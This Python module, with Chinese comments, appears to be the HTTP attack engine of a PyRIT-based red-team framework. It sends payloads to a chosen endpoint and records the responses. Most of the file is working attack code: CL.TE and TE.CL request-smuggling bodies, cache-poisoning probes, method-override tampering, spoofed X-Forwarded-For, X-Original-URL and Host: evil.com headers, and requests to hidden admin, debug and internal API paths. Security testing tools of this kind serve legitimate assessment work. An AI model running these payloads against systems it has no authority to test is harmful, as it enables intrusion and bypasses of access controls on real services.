# -*- coding: utf-8 -*-
"""
http_attack_engine.py - 通用HTTP攻击引擎

消除Web攻击模块中的重复代码，提供统一的HTTP攻击执行框架。
支持速率限制测试、请求走私、缓存投毒、HTTP方法篡改、头部注入等攻击。

Academic basis:
    - OWASP API Security Top 10: API4:2019 Lack of Resources & Rate Limiting
    - PortSwigger: HTTP Request Smuggling (CL.TE / TE.CL)
    - OWASP: Web Cache Poisoning
    - Zeng et al. (arXiv:2402.19181): Enterprise API attack surfaces

版本: v3.0 (2026-09-08 扁平化到 strike/)
"""

from __future__ import annotations

import asyncio
import concurrent.futures
import logging
import uuid
from typing import Any
from urllib.parse import urlparse

logger = logging.getLogger(__name__)

# 传输方式标识：写进每条结果，让报告能区分「原生执行」与「降级执行」（C9 诚实汇报）
TRANSPORT_NATIVE = "pyrit.HTTPTarget"
TRANSPORT_FALLBACK = "urllib-fallback"


def _run_coroutine_sync(coro: Any) -> Any:
    """在同步上下文执行协程；若已在事件循环中则转到独立线程，避免 `asyncio.run` 报错。"""
    try:
        asyncio.get_running_loop()
    except RuntimeError:
        return asyncio.run(coro)
    with concurrent.futures.ThreadPoolExecutor(max_workers=1) as pool:
        return pool.submit(asyncio.run, coro).result()


class HTTPAttackEngine:
    """通用HTTP攻击引擎

    提供统一的HTTP攻击执行框架，消除重复代码。
    支持单payload发送、批量payload执行、结果收集。

    PyRIT原生组件使用:
        - HTTPTarget: HTTP请求发送

    plan Wave 2.10（C1 R-NATIVE-4 / C13）：
        请求执行**委托** PyRIT 原生 `HTTPTarget`，本模块只负责构造原始 HTTP 请求
        （payload 层职责），不再自建 `urllib` 连接发请求。
        仅当原生通道不可用时才降级，且降级原因必须留痕并写进结果（`transport` 字段）。
    """

    def __init__(self, target_endpoint: str, default_timeout: float = 30.0):
        """
        Args:
            target_endpoint: 目标API endpoint
            default_timeout: 默认超时时间
        """
        self.endpoint = target_endpoint
        self.timeout = default_timeout
        # 原生通道不可用原因：只探测一次，避免每个 payload 重复告警刷屏
        self._native_unavailable_reason: str | None = None

    def execute_attack(
        self,
        attack_type: str,
        payloads: list[dict[str, Any]],
    ) -> dict[str, Any]:
        """执行批量攻击（统一入口）

        Args:
            attack_type: 攻击类型名称
            payloads: payload列表，每个payload为字典

        Returns:
            攻击结果字典
        """
        results: list[dict[str, Any]] = []
        for payload in payloads:
            result = self._send_single_payload(payload)
            results.append(result)

        return {
            "attack_type": attack_type,
            "results": results,
        }

    def execute_request_smuggling(
        self,
        smuggling_payloads: list[dict[str, Any]] | None = None,
    ) -> dict[str, Any]:
        """执行请求走私攻击

        Args:
            smuggling_payloads: 自定义走私payload，为None时使用默认payload

        Returns:
            攻击结果字典
        """
        if smuggling_payloads is None:
            smuggling_payloads = self._get_default_smuggling_payloads()

        return self.execute_attack("请求走私", smuggling_payloads)

    def execute_cache_poisoning(
        self,
        cache_key_headers: list[str] | None = None,
    ) -> dict[str, Any]:
        """执行缓存投毒攻击

        Args:
            cache_key_headers: 影响缓存键的header列表

        Returns:
            攻击结果字典
        """
        if cache_key_headers is None:
            cache_key_headers = ["X-Forwarded-Host", "X-Original-URL"]

        results: list[dict[str, Any]] = []
        for header in cache_key_headers:
            result = self._test_cache_poison_header(header)
            results.append(result)

        return {
            "attack_type": "缓存投毒",
            "results": results,
        }

    def execute_method_tampering(
        self,
        target_methods: list[dict[str, Any]] | None = None,
    ) -> dict[str, Any]:
        """执行HTTP方法篡改攻击

        Args:
            target_methods: 自定义方法列表，为None时使用默认方法

        Returns:
            攻击结果字典
        """
        if target_methods is None:
            target_methods = self._get_default_method_payloads()

        return self.execute_attack("HTTP方法篡改", target_methods)

    def execute_header_injection(
        self,
        header_payloads: list[dict[str, Any]] | None = None,
    ) -> dict[str, Any]:
        """执行头部注入攻击

        Args:
            header_payloads: 自定义头部payload，为None时使用默认payload

        Returns:
            攻击结果字典
        """
        if header_payloads is None:
            header_payloads = self._get_default_header_payloads()

        return self.execute_attack("头部注入攻击", header_payloads)

    def execute_version_bypass(
        self,
        version_paths: list[dict[str, Any]] | None = None,
    ) -> dict[str, Any]:
        """执行API版本控制绕过攻击

        Args:
            version_paths: 自定义版本路径，为None时使用默认路径

        Returns:
            攻击结果字典
        """
        if version_paths is None:
            version_paths = self._get_default_version_payloads()

        base_url = self.endpoint.rsplit("/", 1)[0] if "/" in self.endpoint else self.endpoint
        results: list[dict[str, Any]] = []

        for payload in version_paths:
            result = self._send_version_bypass_request(base_url, payload)
            results.append(result)

        return {
            "attack_type": "API版本绕过",
            "results": results,
        }

    # ------------------------------------------------------------------
    # plan Wave 2.10：统一传输层 —— 优先委托 PyRIT 原生 HTTPTarget
    # ------------------------------------------------------------------

    @staticmethod
    def _build_raw_request(method: str, url: str, headers: dict[str, Any], body: str) -> str:
        """构造 Burp 风格原始 HTTP 请求串（payload 层职责，交由 HTTPTarget 解析发送）。

        Args:
            method: HTTP 方法
            url: 完整目标 URL
            headers: 附加请求头
            body: 请求体

        Returns:
            形如 `"POST /path HTTP/1.1\\nHost: ...\\n\\n<body>"` 的原始请求串。
        """
        parsed = urlparse(url)
        host = parsed.hostname or ""
        if parsed.port:
            host = f"{host}:{parsed.port}"
        lines = [f"{method.upper()} {parsed.path or '/'} HTTP/1.1", f"Host: {host}"]
        for key, value in (headers or {}).items():
            lines.append(f"{key}: {value}")
        return "\n".join(lines) + "\n\n" + (body or "")

    def _send_native(
        self,
        *,
        method: str,
        url: str,
        headers: dict[str, Any],
        body: str,
    ) -> dict[str, Any] | None:
        """委托 PyRIT 原生 `HTTPTarget` 发送请求（C1 R-NATIVE-4 / C13）。

        Returns:
            结果 dict；原生通道不可用时返回 None（由调用方降级，且降级必须留痕）。
        """
        if self._native_unavailable_reason is not None:
            return None

        try:
            from pyrit.memory import CentralMemory
            from pyrit.models import Message, MessagePiece
            from pyrit.prompt_target import HTTPTarget

            # HTTPTarget 构造即要求 CentralMemory 已挂载，先探测再决定是否可用
            CentralMemory.get_memory_instance()
        except Exception as e:
            self._native_unavailable_reason = f"{type(e).__name__}: {e}"
            logger.warning(
                "[HTTPEngine] PyRIT 原生 HTTPTarget 不可用，降级自研传输（C1 R-NATIVE-4 违例）：%s",
                e,
            )
            return None

        captured: dict[str, Any] = {}

        def _capture(*, response: Any) -> str:
            captured["status"] = getattr(response, "status_code", None)
            captured["headers"] = dict(getattr(response, "headers", {}) or {})
            return (getattr(response, "text", "") or "")[:500]

        try:
            target = HTTPTarget(
                http_request=self._build_raw_request(method, url, headers, body),
                callback_function=_capture,
                timeout=self.timeout,
            )
            piece = MessagePiece(
                role="user",
                original_value=body or "",
                conversation_id=str(uuid.uuid4()),
            )
            responses = _run_coroutine_sync(
                target.send_prompt_async(message=Message(message_pieces=[piece]))
            )
            text = ""
            error: str | None = None
            if responses and responses[0].message_pieces:
                resp_piece = responses[0].message_pieces[0]
                text = getattr(resp_piece, "converted_value", "") or ""
                resp_error = getattr(resp_piece, "response_error", "none") or "none"
                if resp_error != "none":
                    error = str(resp_error)
        except Exception as e:
            logger.warning("[HTTPEngine] 原生 HTTPTarget 发送失败，降级自研传输：%s", e)
            return None

        result: dict[str, Any] = {
            "status": captured.get("status"),
            "headers": captured.get("headers", {}),
            "body": text,
            "transport": TRANSPORT_NATIVE,
        }
        if error:
            result["error"] = error
        return result

    def send_request(
        self,
        *,
        method: str = "GET",
        url: str | None = None,
        headers: dict[str, Any] | None = None,
        body: str = "",
    ) -> dict[str, Any]:
        """公开的单次请求入口（供 `strike/web/attacks.py` 等复用同一条传输链路）。

        Args:
            method: HTTP 方法
            url: 目标 URL，缺省为本引擎的 endpoint
            headers: 附加请求头
            body: 请求体

        Returns:
            含 status / headers / body / transport 的结果字典。
        """
        return self._send(method=method, url=url or self.endpoint, headers=headers, body=body)

    def _send_fallback(
        self,
        *,
        method: str,
        url: str,
        headers: dict[str, Any],
        body: str,
    ) -> dict[str, Any]:
        """原生通道不可用时的降级传输（仅在降级时执行，且结果标记 transport）。"""
        import urllib.error
        import urllib.request

        try:
            data = body.encode("utf-8") if body else None
            req = urllib.request.Request(url, data=data, method=method.upper())
            for hdr_name, hdr_val in (headers or {}).items():
                req.add_header(hdr_name, hdr_val)
            resp = urllib.request.urlopen(req, timeout=self.timeout)
            return {
                "status": resp.status,
                "headers": dict(resp.headers),
                "body": resp.read(500).decode("utf-8", errors="replace"),
                "transport": TRANSPORT_FALLBACK,
            }
        except urllib.error.HTTPError as e:
            return {"status": e.code, "error": str(e), "transport": TRANSPORT_FALLBACK}
        except Exception as e:  # noqa: BLE001
            return {"error": str(e), "transport": TRANSPORT_FALLBACK}

    def _send(
        self,
        *,
        method: str,
        url: str,
        headers: dict[str, Any] | None = None,
        body: str = "",
        extra: dict[str, Any] | None = None,
    ) -> dict[str, Any]:
        """统一发送入口：先委托原生 HTTPTarget，失败才降级（降级留痕）。

        Args:
            method: HTTP 方法
            url: 目标 URL
            headers: 附加请求头
            body: 请求体
            extra: 需要并入结果的业务字段（如 name / url），避免与传输参数同名冲突
        """
        result = self._send_native(method=method, url=url, headers=headers or {}, body=body or "")
        if result is None:
            result = self._send_fallback(method=method, url=url, headers=headers or {}, body=body or "")
        result.update(extra or {})
        return result

    def _send_single_payload(self, payload: dict[str, Any]) -> dict[str, Any]:
        """发送单个payload

        Args:
            payload: payload字典，包含 name/method/headers/body 等键

        Returns:
            请求结果字典
        """
        return self._send(
            method=payload.get("method", "GET"),
            url=self.endpoint,
            headers=payload.get("headers", {}),
            body=payload.get("body", ""),
            extra={"name": payload.get("name", "unknown")},
        )

    def _test_cache_poison_header(self, header: str) -> dict[str, Any]:
        """测试单个缓存键header的投毒效果

        Args:
            header: 要测试的header名称

        Returns:
            测试结果字典
        """
        name = f"缓存键操纵: {header}"
        # 第一次请求：注入恶意内容
        first = self._send(method="GET", url=self.endpoint, headers={header: "malicious-value"})
        # 第二次请求：验证缓存投毒是否生效
        second = self._send(method="GET", url=self.endpoint)

        return {
            "name": name,
            "first_status": first.get("status"),
            "second_status": second.get("status"),
            "cache_hit": "x-cache" in {k.lower() for k in (second.get("headers") or {})},
            "transport": first.get("transport", second.get("transport")),
            **({"error": first["error"]} if first.get("error") else {}),
        }

    def _send_version_bypass_request(
        self,
        base_url: str,
        payload: dict[str, Any],
    ) -> dict[str, Any]:
        """发送版本绕过请求

        Args:
            base_url: 基础URL
            payload: 包含 name/path 的payload字典

        Returns:
            请求结果字典
        """
        target_url = f"{base_url}{payload['path']}"
        return self._send(
            method="GET",
            url=target_url,
            extra={"name": payload["name"], "url": target_url},
        )

    @staticmethod
    def _get_default_smuggling_payloads() -> list[dict[str, Any]]:
        """获取默认请求走私payload

        Returns:
            默认走私payload列表
        """
        return [
            {
                "name": "CL.TE走私",
                "method": "POST",
                "headers": {
                    "Content-Length": "100",
                    "Transfer-Encoding": "chunked",
                },
                "body": "0\r\n\r\nSMUGGLED_REQUEST",
            },
            {
                "name": "TE.CL走私",
                "method": "POST",
                "headers": {
                    "Content-Length": "6",
                    "Transfer-Encoding": "chunked",
                },
                "body": "0\r\n\r\nG",
            },
            {
                "name": "分块编码绕过",
                "method": "POST",
                "headers": {
                    "Transfer-Encoding": "chunked",
                },
                "body": "0\r\n\r\n",
            },
        ]

    @staticmethod
    def _get_default_method_payloads() -> list[dict[str, Any]]:
        """获取默认HTTP方法篡改payload

        Returns:
            默认方法篡改payload列表
        """
        return [
            {"name": "PUT方法", "method": "PUT", "body": '{"injected": true}'},
            {"name": "DELETE方法", "method": "DELETE", "body": ""},
            {"name": "PATCH方法", "method": "PATCH", "body": '{"role": "admin"}'},
            {"name": "TRACE方法", "method": "TRACE", "body": ""},
            {
                "name": "X-HTTP-Method-Override绕过",
                "method": "POST",
                "headers": {"X-HTTP-Method-Override": "DELETE"},
                "body": "",
            },
            {
                "name": "_method参数绕过",
                "method": "POST",
                "body": "_method=DELETE&action=admin",
            },
        ]

    @staticmethod
    def _get_default_header_payloads() -> list[dict[str, Any]]:
        """获取默认头部注入payload

        Returns:
            默认头部注入payload列表
        """
        return [
            {
                "name": "X-Forwarded-For欺骗",
                "headers": {"X-Forwarded-For": "127.0.0.1, 10.0.0.1"},
            },
            {
                "name": "X-Original-URL绕过",
                "headers": {"X-Original-URL": "/admin"},
            },
            {
                "name": "X-Rewrite-URL绕过",
                "headers": {"X-Rewrite-URL": "/admin/config"},
            },
            {
                "name": "Host头部注入",
                "headers": {"Host": "evil.com"},
            },
            {
                "name": "Referer欺骗",
                "headers": {"Referer": "https://trusted-source.com"},
            },
        ]

    @staticmethod
    def _get_default_version_payloads() -> list[dict[str, Any]]:
        """获取默认API版本绕过payload

        Returns:
            默认版本绕过payload列表
        """
        return [
            {"name": "v0版本", "path": "/api/v0/admin"},
            {"name": "beta版本", "path": "/api/beta/admin"},
            {"name": "debug版本", "path": "/api/debug/users"},
            {"name": "internal版本", "path": "/api/internal/config"},
            {"name": "旧版本回退", "path": "/api/v1.0.0/admin"},
        ]
